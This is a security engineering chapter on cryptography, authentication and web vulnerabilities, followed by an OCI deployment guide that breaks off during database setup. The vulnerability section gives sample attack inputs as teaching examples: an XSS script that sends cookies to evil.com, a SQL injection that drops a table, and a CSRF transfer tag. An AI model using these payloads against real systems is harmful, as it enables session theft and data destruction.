# Chapter 08: Security Engineering

> "Security is not a product, but a process." - Bruce Schneier

---

## 🔐 Cryptography Fundamentals

### Symmetric vs Asymmetric Encryption

```
Symmetric (Same key for encrypt/decrypt):
┌─────────────────────────────────────────────────────────────┐
│                                                             │
│  Plaintext ──► [AES Key] ──► Ciphertext ──► [AES Key] ──► Plaintext
│                    │                            │           │
│                    └──── Same key ──────────────┘           │
│                                                             │
│  Algorithms: AES, ChaCha20                                  │
│  Fast, used for bulk encryption                             │
│  Problem: How to share the key securely?                    │
└─────────────────────────────────────────────────────────────┘

Asymmetric (Different keys):
┌─────────────────────────────────────────────────────────────┐
│                                                             │
│  Plaintext ──► [Public Key] ──► Ciphertext ──► [Private Key] ──► Plaintext
│                                                             │
│  Algorithms: RSA, ECDSA, Ed25519                            │
│  Slow, used for key exchange and signing                    │
│  Public key: Share freely                                   │
│  Private key: Keep secret                                   │
└─────────────────────────────────────────────────────────────┘
```

### Hashing

```
Input (any size) ──► Hash Function ──► Fixed-size output

"Hello" ──► SHA-256 ──► 185f8db32271fe25f561a6fc938b2e26...
"Hello!" ──► SHA-256 ──► 33b9c950a9c0c4e7d569f0cc6a0c76cb... (completely different!)

Properties:
1. Deterministic (same input = same output)
2. One-way (can't reverse)
3. Collision-resistant (hard to find two inputs with same hash)
4. Avalanche effect (small change = big difference)

Common algorithms:
- MD5: Broken, don't use for security
- SHA-1: Deprecated
- SHA-256: Current standard
- SHA-3: Newest standard
- bcrypt/argon2: For passwords (intentionally slow)
```

### Password Storage

```
WRONG:
passwords_table:
│ user_id │ password    │
├─────────┼─────────────┤
│ 1       │ mypassword  │  ← Plaintext! Disaster if leaked

WRONG:
│ user_id │ password_hash                                    │
├─────────┼──────────────────────────────────────────────────┤
│ 1       │ 5f4dcc3b5aa765d61d8327deb882cf99 (MD5)          │
                         ↑ Can be reversed with rainbow tables

RIGHT:
│ user_id │ password_hash                                    │
├─────────┼──────────────────────────────────────────────────┤
│ 1       │ $argon2id$v=19$m=65536,t=3,p=4$salt$hash        │
                         ↑ Salted + slow algorithm

Code:
```

```javascript
// Using argon2 (recommended)
const argon2 = require('argon2');

// Hashing
const hash = await argon2.hash(password, {
  type: argon2.argon2id,
  memoryCost: 65536,    // 64 MB
  timeCost: 3,          // iterations
  parallelism: 4        // threads
});

// Verifying
const valid = await argon2.verify(hash, password);

// Using bcrypt (also good)
const bcrypt = require('bcrypt');
const hash = await bcrypt.hash(password, 12);  // 12 rounds
const valid = await bcrypt.compare(password, hash);
```

---

## 🔑 Authentication Patterns

### Session-Based Authentication

```
┌──────────┐    1. Login         ┌──────────┐
│  Client  │ ──────────────────► │  Server  │
│          │    (user/pass)      │          │
│          │                     │          │
│          │    2. Create        │          │
│          │    session in DB    │    ┌─────┴─────┐
│          │                     │    │ Sessions  │
│          │                     │    │ DB/Redis  │
│          │    3. Set cookie    │    └───────────┘
│          │ ◄─────────────────  │          │
│  Cookie: │    (session_id)     │          │
│  sess=X  │                     │          │
│          │    4. Requests      │          │
│          │ ──────────────────► │          │
│          │    (Cookie: sess=X) │          │
│          │                     │          │
│          │    5. Verify        │          │
│          │    (lookup session) │          │
└──────────┘                     └──────────┘

Pros: Easy to revoke, server controls state
Cons: Requires session storage, not stateless
```

### Token-Based (JWT)

```
┌──────────┐    1. Login         ┌──────────┐
│  Client  │ ──────────────────► │  Server  │
│          │    (user/pass)      │          │
│          │                     │          │
│          │    2. Generate JWT  │          │
│          │ ◄─────────────────  │          │
│ Storage: │    (token)          │          │
│ token=Y  │                     │          │
│          │                     │          │
│          │    3. Requests      │          │
│          │ ──────────────────► │          │
│          │  (Authorization:    │          │
│          │   Bearer Y)         │          │
│          │                     │          │
│          │    4. Verify JWT    │          │
│          │    (signature)      │          │
└──────────┘                     └──────────┘

JWT Structure:
header.payload.signature

{                           {                      HMAC-SHA256(
  "alg": "HS256",            "sub": "user123",       base64(header) + "." +
  "typ": "JWT"               "name": "John",         base64(payload),
}                            "exp": 1234567890       secret
                           }                       )

Pros: Stateless, scalable, works across domains
Cons: Can't revoke (until expiry), larger than session ID
```

### OAuth 2.0 Flows

```
Authorization Code Flow (Most secure, for server apps):

┌────────┐                ┌─────────────┐                ┌─────────────┐
│  User  │                │   Your App  │                │Auth Provider│
│        │                │  (Backend)  │                │  (Google)   │
└───┬────┘                └──────┬──────┘                └──────┬──────┘
    │  1. Click "Login           │                              │
    │     with Google"           │                              │
    │ ──────────────────────────►│                              │
    │                            │  2. Redirect to Google       │
    │ ◄──────────────────────────│──────────────────────────────►
    │                            │                              │
    │  3. User logs in           │                              │
    │     and approves           │                              │
    │ ─────────────────────────────────────────────────────────►│
    │                            │                              │
    │  4. Redirect with          │                              │
    │     auth code              │                              │
    │ ◄─────────────────────────────────────────────────────────│
    │ ──────────────────────────►│                              │
    │                            │  5. Exchange code            │
    │                            │     for tokens               │
    │                            │ ─────────────────────────────►
    │                            │                              │
    │                            │  6. Access + Refresh         │
    │                            │     tokens                   │
    │                            │ ◄─────────────────────────────
    │                            │                              │
    │  7. User logged in         │                              │
    │ ◄──────────────────────────│                              │
```

### API Key Authentication

```
Simple but limited:

curl -H "X-API-Key: abc123" https://api.example.com/data

Pros: Simple to implement
Cons: 
- No user context
- Hard to rotate
- Should be combined with other auth
- Use for server-to-server, not user auth
```

---

## 🛡️ Common Vulnerabilities

### SQL Injection

```
Vulnerable code:
const query = `SELECT * FROM users WHERE email = '${email}'`;

Attack:
email = "'; DROP TABLE users; --"
Result: SELECT * FROM users WHERE email = ''; DROP TABLE users; --'

Prevention:
1. Parameterized queries (ALWAYS)
   const result = await db.query(
     'SELECT * FROM users WHERE email = $1',
     [email]
   );

2. ORM with proper escaping
   const user = await User.findOne({ where: { email } });
```

### XSS (Cross-Site Scripting)

```
Stored XSS:
Attacker posts: <script>document.location='http://evil.com/steal?'+document.cookie</script>
Other users load page → script executes → cookies stolen

Reflected XSS:
URL: https://example.com/search?q=<script>alert('xss')</script>
Page renders search term without escaping → script executes

Prevention:
1. Escape output (HTML entities)
   < becomes &lt;
   > becomes &gt;
   
2. Content Security Policy (CSP)
   Content-Security-Policy: script-src 'self'
   
3. HttpOnly cookies (JS can't access)
   Set-Cookie: session=abc; HttpOnly; Secure

4. Use framework's auto-escaping
   React: {userInput}  // Auto-escaped
   Vue: {{ userInput }} // Auto-escaped
```

### CSRF (Cross-Site Request Forgery)

```
Attack scenario:
1. User logged into bank.com
2. User visits evil.com
3. evil.com has: <img src="https://bank.com/transfer?to=attacker&amount=1000">
4. Browser sends request with user's cookies
5. Money transferred!

Prevention:
1. CSRF tokens
   <form>
     <input type="hidden" name="_csrf" value="random_token">
   </form>
   Server validates token matches session

2. SameSite cookies
   Set-Cookie: session=abc; SameSite=Strict

3. Check Origin/Referer header
```

### IDOR (Insecure Direct Object Reference)

```
Vulnerable:
GET /api/users/123/documents
Attacker changes to:
GET /api/users/456/documents  → Gets other user's documents!

Prevention:
// Always check ownership
async function getDocuments(req, res) {
  const { userId } = req.params;
  
  // Check that requesting user owns this resource
  if (req.user.id !== userId && !req.user.isAdmin) {
    return res.status(403).json({ error: 'Forbidden' });
  }
  
  // Or better: only fetch user's own documents
  const docs = await Document.find({ ownerId: req.user.id });
}
```

---

## 🏰 Defense in Depth

```
┌─────────────────────────────────────────────────────────────────┐
│                     Layer 1: Edge/CDN                           │
│            DDoS protection, WAF, rate limiting                  │
├─────────────────────────────────────────────────────────────────┤
│                     Layer 2: Load Balancer                      │
│            SSL termination, request filtering                   │
├─────────────────────────────────────────────────────────────────┤
│                     Layer 3: API Gateway                        │
│            Authentication, rate limiting, logging               │
├─────────────────────────────────────────────────────────────────┤
│                     Layer 4: Application                        │
│            Input validation, authorization, business logic      │
├─────────────────────────────────────────────────────────────────┤
│                     Layer 5: Database                           │
│            Encryption at rest, access controls, audit logs      │
├─────────────────────────────────────────────────────────────────┤
│                     Layer 6: Network                            │
│            VPC, security groups, private subnets                │
└─────────────────────────────────────────────────────────────────┘
```

---

## 🔒 Security Best Practices

### Input Validation

```javascript
// ALWAYS validate and sanitize input

// Using zod
import { z } from 'zod';

const UserSchema = z.object({
  email: z.string().email().max(255),
  name: z.string().min(1).max(100),
  age: z.number().int().min(0).max(150),
});

// Validate
const result = UserSchema.safeParse(input);
if (!result.success) {
  return res.status(400).json({ errors: result.error.issues });
}

// Sanitize HTML (if needed)
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(dirtyHtml);
```

### Secrets Management

```
WRONG:
// Hardcoded in code
const API_KEY = 'sk-1234567890';

// In git
.env
API_KEY=sk-1234567890

RIGHT:
// Environment variables (not in git)
const API_KEY = process.env.API_KEY;

// Secret manager (production)
const secret = await secretManager.getSecret('api-key');

// Vault (enterprise)
const secret = await vault.read('secret/data/api-key');

Best practices:
1. Never commit secrets to git
2. Use different secrets per environment
3. Rotate secrets regularly
4. Use short-lived credentials when possible
5. Audit secret access
```

### Security Headers

```javascript
// Using helmet.js
const helmet = require('helmet');
app.use(helmet());

// Or manually:
app.use((req, res, next) => {
  // Prevent clickjacking
  res.setHeader('X-Frame-Options', 'DENY');
  
  // Prevent MIME sniffing
  res.setHeader('X-Content-Type-Options', 'nosniff');
  
  // Enable XSS filter
  res.setHeader('X-XSS-Protection', '1; mode=block');
  
  // HTTPS only
  res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
  
  // Content Security Policy
  res.setHeader('Content-Security-Policy', "default-src 'self'");
  
  next();
});
```

### Rate Limiting

```javascript
const rateLimit = require('express-rate-limit');

// General rate limit
const generalLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100, // 100 requests per window
  message: 'Too many requests'
});

// Strict limit for auth endpoints
const authLimiter = rateLimit({
  windowMs: 60 * 60 * 1000, // 1 hour
  max: 5, // 5 attempts
  message: 'Too many login attempts'
});

app.use('/api/', generalLimiter);
app.use('/api/auth/login', authLimiter);
```

---

## 🔐 HTTPS/TLS Configuration

```nginx
# Nginx TLS configuration

server {
    listen 443 ssl http2;
    server_name example.com;
    
    # Certificates
    ssl_certificate /etc/letsencrypt/live/example.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/example.com/privkey.pem;
    
    # Modern TLS only
    ssl_protocols TLSv1.2 TLSv1.3;
    
    # Strong cipher suites
    ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256;
    ssl_prefer_server_ciphers off;
    
    # OCSP Stapling
    ssl_stapling on;
    ssl_stapling_verify on;
    
    # Session resumption
    ssl_session_timeout 1d;
    ssl_session_cache shared:SSL:50m;
    ssl_session_tickets off;
    
    # HSTS
    add_header Strict-Transport-Security "max-age=63072000" always;
}
```

---

## 📝 Security Checklist

```
Authentication:
□ Strong password policy (12+ chars, complexity)
□ Account lockout after failed attempts
□ Secure password reset flow
□ MFA for sensitive operations
□ Session timeout and invalidation

Authorization:
□ Principle of least privilege
□ Role-based access control
□ Resource ownership checks
□ API endpoint authorization

Data Protection:
□ Encryption at rest (database, files)
□ Encryption in transit (TLS everywhere)
□ PII handling compliance (GDPR, etc.)
□ Secure data deletion

Infrastructure:
□ Firewall rules (minimal access)
□ Private networks for databases
□ Regular security updates
□ Intrusion detection
□ DDoS protection

Monitoring:
□ Security logging (auth events, errors)
□ Alerting on anomalies
□ Regular security audits
□ Penetration testing
```

---

## 📖 Further Reading

- OWASP Top 10
- "The Web Application Hacker's Handbook"
- "Cryptography Engineering" by Schneier
- NIST Cybersecurity Framework

---

**Next:** [Chapter 09: Observability →](./09-observability.md)



# Complete 6-Layer Security Implementation Guide
## Web Application Deployment on Oracle Cloud Infrastructure (OCI)

---

## Table of Contents

1. [Overview & Architecture](#overview--architecture)
2. [Prerequisites](#prerequisites)
3. [Phase 1: Layer 6 - Network Foundation](#phase-1-layer-6---network-foundation-vcn)
4. [Phase 2: Layer 5 - Database Setup](#phase-2-layer-5---database-setup)
5. [Phase 3: Layer 4 - Application Deployment](#phase-3-layer-4---application-deployment)
6. [Phase 4: SSH/Bastion Access](#phase-4-sshbastion-access)
7. [Phase 5: Layer 2 - Load Balancer + TLS](#phase-5-layer-2---load-balancer--tls-lets-encrypt)
8. [Phase 6: Layer 3 - API Gateway](#phase-6-layer-3---api-gateway)
9. [Phase 7: Layer 1 - WAF/Edge Protection](#phase-7-layer-1---wafedge-protection)
10. [Application Code Implementation](#application-code-implementation)
11. [Verification & Testing](#verification--testing)
12. [Maintenance & Operations](#maintenance--operations)

---

## Overview & Architecture

### Target Architecture

```
┌─────────────────────────────────────────────────────────────────────────┐
│                              INTERNET                                    │
└─────────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────────┐
│  LAYER 1: WAF/CDN (OCI WAF)                                             │
│  - DDoS protection                                                       │
│  - OWASP rules                                                          │
│  - Bot mitigation                                                        │
│  - Rate limiting (/login, /otp)                                         │
└─────────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────────┐
│  LAYER 2: Load Balancer (Nginx + Let's Encrypt)                         │
│  - TLS termination                                                       │
│  - SSL certificates                                                      │
│  - Request filtering                                                     │
│  - Health checks                                                         │
│  [PUBLIC SUBNET: 10.0.1.0/24]                                           │
└─────────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────────┐
│  LAYER 3: API Gateway (OCI API Gateway)                                 │
│  - JWT validation                                                        │
│  - Per-consumer quotas                                                   │
│  - Request logging                                                       │
│  - Correlation IDs                                                       │
└─────────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────────┐
│  LAYER 4: Application (Node.js/Express)                                 │
│  - Input validation                                                      │
│  - Authorization (object-level)                                         │
│  - Business logic                                                        │
│  - Secure coding                                                         │
│  [PRIVATE SUBNET: 10.0.2.0/24]                                          │
└─────────────────────────────────────────────────────────────────────────┘
                                    │
                                    ▼
┌─────────────────────────────────────────────────────────────────────────┐
│  LAYER 5: Database (PostgreSQL)                                         │
│  - Encryption at rest                                                    │
│  - Least privilege users                                                 │
│  - Audit logs                                                            │
│  - Backups                                                               │
│  [PRIVATE DB SUBNET: 10.0.3.0/24]                                       │
└─────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────┐
│  LAYER 6: Network (VCN)                                                 │
│  - VPC/Subnets                                                          │
│  - Security Groups (NSGs)                                               │
│  - Internet Gateway / NAT Gateway                                       │
│  - Route Tables                                                          │
└─────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────┐
│  ADMIN ACCESS: Bastion                                                  │
│  - SSH key-only                                                          │
│  - Time-limited sessions                                                 │
│  - Audit trail                                                           │
└─────────────────────────────────────────────────────────────────────────┘
```

### Implementation Order

| Step | Layer | What | Time Estimate |
|------|-------|------|---------------|
| 1 | Layer 6 | VCN, Subnets, NSGs, Gateways | 30 mins |
| 2 | Layer 5 | Database in private subnet | 20 mins |
| 3 | Layer 4 | Application deployment | 45 mins |
| 4 | Bastion | Admin SSH access | 15 mins |
| 5 | Layer 2 | Nginx + Let's Encrypt | 30 mins |
| 6 | Layer 3 | API Gateway policies | 30 mins |
| 7 | Layer 1 | WAF configuration | 20 mins |

---

## Prerequisites

### Required Tools

```bash
# Install OCI CLI
bash -c "$(curl -L https://raw.githubusercontent.com/oracle/oci-cli/master/scripts/install/install.sh)"

# Configure OCI CLI
oci setup config
# Enter: User OCID, Tenancy OCID, Region, Key location

# Verify setup
oci iam region list --output table
```

### Required Information

Before starting, gather these OCIDs:

```bash
# Create a config file to store OCIDs
cat > ~/oci-config.env << 'EOF'
# OCI Configuration
export COMPARTMENT_ID="ocid1.compartment.oc1..xxxxx"
export TENANCY_ID="ocid1.tenancy.oc1..xxxxx"
export REGION="us-ashburn-1"
export AD_NAME="AD-1"  # Availability Domain

# Will be populated as we create resources
export VCN_ID=""
export PUBLIC_SUBNET_ID=""
export PRIVATE_APP_SUBNET_ID=""
export PRIVATE_DB_SUBNET_ID=""
export IGW_ID=""
export NAT_ID=""
export NSG_LB_ID=""
export NSG_APP_ID=""
export NSG_DB_ID=""
export NSG_BASTION_ID=""
EOF

source ~/oci-config.env
```

### Get Ubuntu Image OCID

```bash
# List available Ubuntu images
oci compute image list \
  --compartment-id $COMPARTMENT_ID \
  --operating-system "Canonical Ubuntu" \
  --operating-system-version "22.04" \
  --shape "VM.Standard.E4.Flex" \
  --sort-by TIMECREATED \
  --sort-order DESC \
  --query 'data[0].id' \
  --raw-output

# Save the image OCID
export UBUNTU_IMAGE_ID="ocid1.image.oc1..xxxxx"
```

---

## Phase 1: Layer 6 - Network Foundation (VCN)

### Step 1.1: Create VCN

```bash
# Create the Virtual Cloud Network
VCN_ID=$(oci network vcn create \
  --compartment-id $COMPARTMENT_ID \
  --cidr-blocks '["10.0.0.0/16"]' \
  --display-name "webapp-vcn" \
  --dns-label "webappvcn" \
  --query 'data.id' \
  --raw-output)

echo "VCN_ID=$VCN_ID" >> ~/oci-config.env
echo "Created VCN: $VCN_ID"
```

### Step 1.2: Create Internet Gateway

```bash
# Create Internet Gateway for public subnet
IGW_ID=$(oci network internet-gateway create \
  --compartment-id $COMPARTMENT_ID \
  --vcn-id $VCN_ID \
  --display-name "webapp-igw" \
  --is-enabled true \
  --query 'data.id' \
  --raw-output)

echo "IGW_ID=$IGW_ID" >> ~/oci-config.env
echo "Created Internet Gateway: $IGW_ID"
```

### Step 1.3: Create NAT Gateway

```bash
# Create NAT Gateway for private subnets (outbound internet)
NAT_ID=$(oci network nat-gateway create \
  --compartment-id $COMPARTMENT_ID \
  --vcn-id $VCN_ID \
  --display-name "webapp-nat" \
  --query 'data.id' \
  --raw-output)

echo "NAT_ID=$NAT_ID" >> ~/oci-config.env
echo "Created NAT Gateway: $NAT_ID"
```

### Step 1.4: Create Route Tables

```bash
# Public Route Table (routes to Internet Gateway)
PUBLIC_RT_ID=$(oci network route-table create \
  --compartment-id $COMPARTMENT_ID \
  --vcn-id $VCN_ID \
  --display-name "public-route-table" \
  --route-rules "[{
    \"destination\": \"0.0.0.0/0\",
    \"destinationType\": \"CIDR_BLOCK\",
    \"networkEntityId\": \"$IGW_ID\"
  }]" \
  --query 'data.id' \
  --raw-output)

echo "Created Public Route Table: $PUBLIC_RT_ID"

# Private Route Table (routes to NAT Gateway)
PRIVATE_RT_ID=$(oci network route-table create \
  --compartment-id $COMPARTMENT_ID \
  --vcn-id $VCN_ID \
  --display-name "private-route-table" \
  --route-rules "[{
    \"destination\": \"0.0.0.0/0\",
    \"destinationType\": \"CIDR_BLOCK\",
    \"networkEntityId\": \"$NAT_ID\"
  }]" \
  --query 'data.id' \
  --raw-output)

echo "Created Private Route Table: $PRIVATE_RT_ID"
```

### Step 1.5: Create Security Lists (Default)

```bash
# Create minimal default security list (we'll use NSGs for fine-grained control)
DEFAULT_SL_ID=$(oci network security-list create \
  --compartment-id $COMPARTMENT_ID \
  --vcn-id $VCN_ID \
  --display-name "minimal-security-list" \
  --egress-security-rules '[{
    "destination": "0.0.0.0/0",
    "protocol": "all",
    "isStateless": false
  }]' \
  --ingress-security-rules '[]' \
  --query 'data.id' \
  --raw-output)

echo "Created Security List: $DEFAULT_SL_ID"
```

### Step 1.6: Create Subnets

```bash
# Get Availability Domain name
AD_NAME=$(oci iam availability-domain list \
  --compartment-id $TENANCY_ID \
  --query 'data[0].name' \
  --raw-output)

# PUBLIC SUBNET (for Load Balancer + Bastion)
PUBLIC_SUBNET_ID=$(oci network subnet create \
  --compartment-id $COMPARTMENT_ID \
  --vcn-id $VCN_ID \
  --cidr-block "10.0.1.0/24" \
  --display-name "public-subnet" \
  --dns-label "public" \
  --route-table-id $PUBLIC_RT_ID \
  --security-list-ids "[\"$DEFAULT_SL_ID\"]" \
  --prohibit-public-ip-on-vnic false \
  --query 'data.id' \
  --raw-output)

echo "PUBLIC_SUBNET_ID=$PUBLIC_SUBNET_ID" >> ~/oci-config.env
echo "Created Public Subnet: $PUBLIC_SUBNET_ID"

# PRIVATE APP SUBNET (for application servers)
PRIVATE_APP_SUBNET_ID=$(oci network subnet create \
  --compartment-id $COMPARTMENT_ID \
  --vcn-id $VCN_ID \
  --cidr-block "10.0.2.0/24" \
  --display-name "private-app-subnet" \
  --dns-label "app" \
  --route-table-id $PRIVATE_RT_ID \
  --security-list-ids "[\"$DEFAULT_SL_ID\"]" \
  --prohibit-public-ip-on-vnic true \
  --query 'data.id' \
  --raw-output)

echo "PRIVATE_APP_SUBNET_ID=$PRIVATE_APP_SUBNET_ID" >> ~/oci-config.env
echo "Created Private App Subnet: $PRIVATE_APP_SUBNET_ID"

# PRIVATE DB SUBNET (for database)
PRIVATE_DB_SUBNET_ID=$(oci network subnet create \
  --compartment-id $COMPARTMENT_ID \
  --vcn-id $VCN_ID \
  --cidr-block "10.0.3.0/24" \
  --display-name "private-db-subnet" \
  --dns-label "db" \
  --route-table-id $PRIVATE_RT_ID \
  --security-list-ids "[\"$DEFAULT_SL_ID\"]" \
  --prohibit-public-ip-on-vnic true \
  --query 'data.id' \
  --raw-output)

echo "PRIVATE_DB_SUBNET_ID=$PRIVATE_DB_SUBNET_ID" >> ~/oci-config.env
echo "Created Private DB Subnet: $PRIVATE_DB_SUBNET_ID"
```

### Step 1.7: Create Network Security Groups (NSGs)

```bash
# NSG for Load Balancer
NSG_LB_ID=$(oci network nsg create \
  --compartment-id $COMPARTMENT_ID \
  --vcn-id $VCN_ID \
  --display-name "nsg-loadbalancer" \
  --query 'data.id' \
  --raw-output)

echo "NSG_LB_ID=$NSG_LB_ID" >> ~/oci-config.env

# NSG for Application
NSG_APP_ID=$(oci network nsg create \
  --compartment-id $COMPARTMENT_ID \
  --vcn-id $VCN_ID \
  --display-name "nsg-application" \
  --query 'data.id' \
  --raw-output)

echo "NSG_APP_ID=$NSG_APP_ID" >> ~/oci-config.env

# NSG for Database
NSG_DB_ID=$(oci network nsg create \
  --compartment-id $COMPARTMENT_ID \
  --vcn-id $VCN_ID \
  --display-name "nsg-database" \
  --query 'data.id' \
  --raw-output)

echo "NSG_DB_ID=$NSG_DB_ID" >> ~/oci-config.env

# NSG for Bastion
NSG_BASTION_ID=$(oci network nsg create \
  --compartment-id $COMPARTMENT_ID \
  --vcn-id $VCN_ID \
  --display-name "nsg-bastion" \
  --query 'data.id' \
  --raw-output)

echo "NSG_BASTION_ID=$NSG_BASTION_ID" >> ~/oci-config.env

echo "Created all NSGs"
```

### Step 1.8: Add NSG Security Rules

```bash
# ============================================
# NSG-LB Rules: Allow 80/443 from internet
# ============================================
oci network nsg rules add \
  --nsg-id $NSG_LB_ID \
  --security-rules "[
    {
      \"direction\": \"INGRESS\",
      \"protocol\": \"6\",
      \"source\": \"0.0.0.0/0\",
      \"sourceType\": \"CIDR_BLOCK\",
      \"tcpOptions\": {
        \"destinationPortRange\": {\"min\": 443, \"max\": 443}
      },
      \"description\": \"Allow HTTPS from internet\"
    },
    {
      \"direction\": \"INGRESS\",
      \"protocol\": \"6\",
      \"source\": \"0.0.0.0/0\",
      \"sourceType\": \"CIDR_BLOCK\",
      \"tcpOptions\": {
        \"destinationPortRange\": {\"min\": 80, \"max\": 80}
      },
      \"description\": \"Allow HTTP from internet (redirect to HTTPS)\"
    },
    {
      \"direction\": \"EGRESS\",
      \"protocol\": \"6\",
      \"destination\": \"$NSG_APP_ID\",
      \"destinationType\": \"NETWORK_SECURITY_GROUP\",
      \"tcpOptions\": {
        \"destinationPortRange\": {\"min\": 3000, \"max\": 3000}
      },
      \"description\": \"Allow outbound to app servers\"
    }
  ]"

echo "Added NSG-LB rules"

# ============================================
# NSG-APP Rules: Allow traffic only from LB
# ============================================
oci network nsg rules add \
  --nsg-id $NSG_APP_ID \
  --security-rules "[
    {
      \"direction\": \"INGRESS\",
      \"protocol\": \"6\",
      \"source\": \"$NSG_LB_ID\",
      \"sourceType\": \"NETWORK_SECURITY_GROUP\",
      \"tcpOptions\": {
        \"destinationPortRange\": {\"min\": 3000, \"max\": 3000}
      },
      \"description\": \"Allow app port from LB only\"
    },
    {
      \"direction\": \"INGRESS\",
      \"protocol\": \"6\",
      \"source\": \"$NSG_BASTION_ID\",
      \"sourceType\": \"NETWORK_SECURITY_GROUP\",
      \"tcpOptions\": {
        \"destinationPortRange\": {\"min\": 22, \"max\": 22}
      },
      \"description\": \"Allow SSH from bastion only\"
    },
    {
      \"direction\": \"EGRESS\",
      \"protocol\": \"6\",
      \"destination\": \"$NSG_DB_ID\",
      \"destinationType\": \"NETWORK_SECURITY_GROUP\",
      \"tcpOptions\": {
        \"destinationPortRange\": {\"min\": 5432, \"max\": 5432}
      },
      \"description\": \"Allow outbound to database\"
    },
    {
      \"direction\": \"EGRESS\",
      \"protocol\": \"6\",
      \"destination\": \"0.0.0.0/0\",
      \"destinationType\": \"CIDR_BLOCK\",
      \"tcpOptions\": {
        \"destinationPortRange\": {\"min\": 443, \"max\": 443}
      },
      \"description\": \"Allow HTTPS outbound (for external APIs)\"
    }
  ]"

echo "Added NSG-APP rules"

# ============================================
# NSG-DB Rules: Allow traffic only from App
# ============================================
oci network nsg rules add \
  --nsg-id $NSG_DB_ID \
  --security-rules "[
    {
      \"direction\": \"INGRESS\",
      \"protocol\": \"6\",
      \"source\": \"$NSG_APP_ID\",
      \"sourceType\": \"NETWORK_SECURITY_GROUP\",
      \"tcpOptions\": {
        \"destinationPortRange\": {\"min\": 5432, \"max\": 5432}
      },
      \"description\": \"Allow PostgreSQL from app only\"
    },
    {
      \"direction\": \"INGRESS\",
      \"protocol\": \"6\",
      \"source\": \"$NSG_BASTION_ID\",
      \"sourceType\": \"NETWORK_SECURITY_GROUP\",
      \"tcpOptions\": {
        \"destinationPortRange\": {\"min\": 22, \"max\": 22}
      },
      \"description\": \"Allow SSH from bastion only\"
    }
  ]"

echo "Added NSG-DB rules"

# ============================================
# NSG-BASTION Rules: Allow SSH from your IP only
# ============================================
# Replace YOUR_PUBLIC_IP with your actual IP
YOUR_PUBLIC_IP="YOUR_IP_HERE/32"  # e.g., "203.0.113.50/32"

oci network nsg rules add \
  --nsg-id $NSG_BASTION_ID \
  --security-rules "[
    {
      \"direction\": \"INGRESS\",
      \"protocol\": \"6\",
      \"source\": \"$YOUR_PUBLIC_IP\",
      \"sourceType\": \"CIDR_BLOCK\",
      \"tcpOptions\": {
        \"destinationPortRange\": {\"min\": 22, \"max\": 22}
      },
      \"description\": \"Allow SSH from admin IP only\"
    },
    {
      \"direction\": \"EGRESS\",
      \"protocol\": \"6\",
      \"destination\": \"10.0.0.0/16\",
      \"destinationType\": \"CIDR_BLOCK\",
      \"tcpOptions\": {
        \"destinationPortRange\": {\"min\": 22, \"max\": 22}
      },
      \"description\": \"Allow SSH to VCN hosts\"
    }
  ]"

echo "Added NSG-BASTION rules"
```

### Layer 6 Verification

```bash
# Verify VCN setup
echo "=== VCN Summary ==="
oci network vcn get --vcn-id $VCN_ID --query 'data.{Name:"display-name",CIDR:"cidr-blocks",State:"lifecycle-state"}' --output table

echo "=== Subnets ==="
oci network subnet list --compartment-id $COMPARTMENT_ID --vcn-id $VCN_ID --query 'data[*].{Name:"display-name",CIDR:"cidr-block",Public:"prohibit-public-ip-on-vnic"}' --output table

echo "=== NSGs ==="
oci network nsg list --compartment-id $COMPARTMENT_ID --vcn-id $VCN_ID --query 'data[*].{Name:"display-name",ID:"id"}' --output table
```

---

## Phase 2: Layer 5 - Database Setup

### Step 2.1: Create Database VM

```bash
# Source config
source ~/oci-config.env

# Create Database Server VM
DB_INSTANCE_ID=$(oci compute instance launch \
  --compartment-id $COMPARTMENT_ID \
  --availability-domain $AD_NAME \
  --shape "VM.Standard.E4.Flex" \
  --shape-config '{"ocpus": 1, "memoryInGBs": 8}' \
  --subnet-id $PRIVATE_DB_SUBNET_ID \
  --nsg-ids "[\"$NSG_DB_ID\"]" \
  --image-id $UBUNTU_IMAGE_ID \
  --display-name "db-server" \
  --assign-public-ip false \
  --ssh-authorized-keys-file ~/.ssh/id_ed25519.pub \
  --query 'data.id' \
  --raw-output)

echo "DB_INSTANCE_ID=$DB_INSTANCE_ID" >> ~/oci-config.env
echo "Created DB Instance: $DB_INSTANCE_ID"

# Wait for instance to be running
echo "Waiting for instance to be RUNNING..."
oci compute instance get --instance-id $DB_INSTANCE_ID --query 'data."lifecycle-state"'

# Get private IP
DB_PRIVATE_IP=$(oci compute instance list-vnics \
  --instance-id $DB_INSTANCE_ID \
  --query 'data[0]."private-ip"' \
  --raw-output)

echo "DB_PRIVATE_IP=$DB_PRIVATE_IP" >> ~/oci-config.env
echo "DB Private IP: $DB_PRIVATE_IP"
```

### Step 2.2: Install PostgreSQL (via Bastion - do after Phase 4)

Once bastion is set up, SSH to db-server and run:

```bash
# On DB Server (via bastion)

# Install PostgreSQL
sudo apt update
sudo apt install -y postgresql postgresql-contrib

# Start and enable
sudo systemctl start postgresql
sudo systemctl enable postgresql

# Configure PostgreSQL to listen on private IP
sudo sed -i "s/#listen_addresses = 'localhost'/listen_addresses = '*'/" /etc/postgresql/*/main/postgresql.conf

# Allow connections from app subnet
echo "host    webapp_db    app_user    10.0.2.0/24    scram-sha-256" | sudo tee -a /etc/postgresql/*/main/pg_hba.conf

# Restart PostgreSQL
sudo systemctl restart postgresql

# Create database and users with LEAST PRIVILEGE
sudo -u postgres psql << 'EOF'
-- Create database
CREATE DATABASE webapp_db;

-- Create application user (minimal privileges)
CREATE USER app_user WITH PASSWORD 'CHANGE_THIS_STRONG_PASSWORD_1';

-- Create migration user (schema changes only)
CREATE USER migration_user WITH PASSWORD 'CHANGE_THIS_STRONG_PASSWORD_2';

